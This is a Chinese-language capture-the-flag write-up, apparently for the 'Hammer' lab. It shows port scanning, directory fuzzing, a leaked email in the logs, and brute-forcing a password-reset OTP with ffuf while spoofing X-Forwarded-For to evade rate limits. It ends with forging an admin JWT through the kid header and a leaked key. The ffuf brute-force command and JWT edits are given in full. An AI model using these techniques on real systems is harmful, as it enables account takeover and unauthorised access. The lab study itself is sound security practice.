信息收集 (Reconnaissance)

首先使用 Nmap 对目标进行端口扫描。

nmap -sS -p- 10.10.xx.xx

为了提高扫描效率，使用 SYN Scan (-sS) 进行快速扫描。

扫描结果发现：

端口	服务
22	SSH
1337	Web Server

说明目标为 Linux Web服务器。

📷 扫描结果

[此处插入图片]
images/nmap_scan.png
2 Web 枚举

访问 Web 服务：

http://10.10.xx.xx:1337

观察登录页面发现：

错误登录返回信息统一

提示 账户或密码错误

说明：

无法进行简单账号密码爆破。

3 忘记密码功能分析

系统提供 密码找回功能。

测试发现：

输入不存在邮箱 → 返回 Invalid Email

存在邮箱 → 不同返回信息

因此：

该接口 可能存在用户名枚举漏洞。

4 目录扫描

查看页面源代码发现：

网站目录命名规则：

hmr_DIRECTORY_NAME

于是使用 ffuf 进行模糊测试。

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-u http://10.10.xx.xx:1337/hmr_FUZZ

📷 ffuf扫描结果

[此处插入图片]
images/ffuf_scan.png

发现目录：

hmr_logs
5 日志文件泄露

访问目录：

http://10.10.xx.xx:1337/hmr_logs

发现日志文件：

error.logs

日志中泄露了一个有效邮箱：

tester@hammer.thm

📷 日志泄露

[此处插入图片]
images/log_leak.png
6 密码重置功能分析

使用该邮箱进行 密码重置。

系统要求输入：

4位 OTP 验证码

OTP范围：

0000 - 9999
7 速率限制分析

使用 Burp Intruder 尝试爆破。

发现：

Rate-Limit-Pending

系统限制：

最多8次尝试

之后会自动退出。

8 绕过 Rate Limit

抓包分析发现：

请求头中存在 IP识别机制。

缺少：

X-Forwarded-For

于是尝试添加：

X-Forwarded-For: 127.0.0.1

发现：

速率限制被重置。

原因：

应用信任 HTTP Header中的IP。

因此可以 伪造IP绕过限制。

9 使用 ffuf 爆破 OTP

首先生成 OTP 字典：

seq -w 0000 9999 > numbers.txt

使用 ffuf 进行爆破：

ffuf -w numbers.txt \
-u http://10.10.xx.xx:1337/reset_password.php \
-X POST \
-d "recovery_code=FUZZ&s=60" \
-H "Cookie: PHPSESSID=SESSIONID" \
-H "X-Forwarded-For: FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fr "Invalid" \
-s

关键参数解释：

参数	说明
-w	字典
-X POST	POST请求
-d	POST数据
-H	添加Header
-fr	过滤响应
-s	静默模式

📷 爆破成功

[此处插入图片]
images/otp_success.png

成功获得 OTP。

10 登录系统

使用 OTP 重置密码并登录。

登录后发现：

一个 命令执行界面。

11 会话 Token 分析

抓包发现：

系统使用 JWT Token。

并且：

token包含 role

使用 HS256

JWT Header：

{
 "alg": "HS256",
 "kid": "/var/www/mykey.key"
}
12 JWT漏洞利用

在命令执行界面执行：

ls

发现文件：

188ade1.key

尝试访问：

http://10.10.xx.xx:1337/188ade1.txt

成功下载密钥。

📷 密钥泄露

[此处插入图片]
images/key_leak.png
13 JWT权限提升

修改 JWT：

Header

kid: /var/www/html/188ade1.key

Payload

role: admin

并使用泄露的密钥重新签名。

生成新的 JWT。

14 获取 Flag

将新 Token 替换：

Authorization Header

Cookie

然后执行命令：

cat /home/ubuntu.flag.txt

成功获取 Flag。

📷 获取 Flag

[此处插入图片]
images/root_flag.png
攻击路径总结

完整攻击流程：

Nmap扫描
      ↓
目录扫描
      ↓
日志泄露邮箱
      ↓
密码重置
      ↓
OTP爆破
      ↓
绕过速率限制
      ↓
登录系统
      ↓
JWT分析
      ↓
密钥泄露
      ↓
JWT伪造
      ↓
命令执行
      ↓
获取Flag
